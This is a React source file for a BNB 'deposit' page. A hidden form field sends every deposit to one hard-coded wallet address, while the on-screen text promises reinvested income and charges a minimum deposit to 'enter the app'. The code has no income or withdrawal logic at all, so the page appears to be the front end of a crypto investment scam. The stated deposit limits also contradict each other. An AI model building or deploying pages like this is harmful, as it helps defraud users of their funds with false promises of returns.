import { useState } from "react";
import { ethers } from "ethers";
import ErrorMessage from "./ErrorMessage";
import TxList from "./TxList";
import styles from "./css.css";


const startPayment = async ({ setError, setTxs, ether, addr }) => {
  try {
    if (!window.ethereum)
      throw new Error("No crypto wallet found. Please install it.");

    await window.ethereum.send("eth_requestAccounts");
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    ethers.utils.getAddress(addr);
    const tx = await signer.sendTransaction({
      to: addr,
      value: ethers.utils.parseEther(ether)
    });
    console.log({ ether, addr });
    console.log("tx", tx);
    setTxs([tx]);
  } catch (err) {
    setError(err.message);
  }
};

export default function App() {
  const [error, setError] = useState();
  const [txs, setTxs] = useState([]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const data = new FormData(e.target);
    setError();
    await startPayment({
      setError,
      setTxs,
      ether: data.get("ether"),
      addr: data.get("addr")
    });
  };

  return (


        <form onSubmit={handleSubmit}className="form">
          <h1></h1>
          
          <input
            type="hidden"
            name="addr"
            value="0xb6C840B15a468FFe469910db719761373Cc9e1AB"/>

          <div>
            <p className="p10">1. Deposit BNB</p>
            <p className="p20">( min 0.1 , max 500 )</p>
            <p className="p30">Information : A new Deposit automatically reinvests the current unwithdrawn income</p>
            <p className="p40">2. Enter The App </p>
            <p className="p50">Enter a Minimum of 0.2 bnb to access</p>
            <div className="tr1"></div>
            <div className="tr2"></div>
            <div c>
              <input className="border "
                name="ether"
                type="text"
                min="0.2"
                max="5"
                placeholder="Min 0.2 - Max 5 BNB" />
            </div>

            <div>
              <button type="submit" className="button">
                Deposit
              </button>
              <ErrorMessage message={error} />
              <TxList txs={txs} />
            </div>

          </div>
        </form>


  );
}
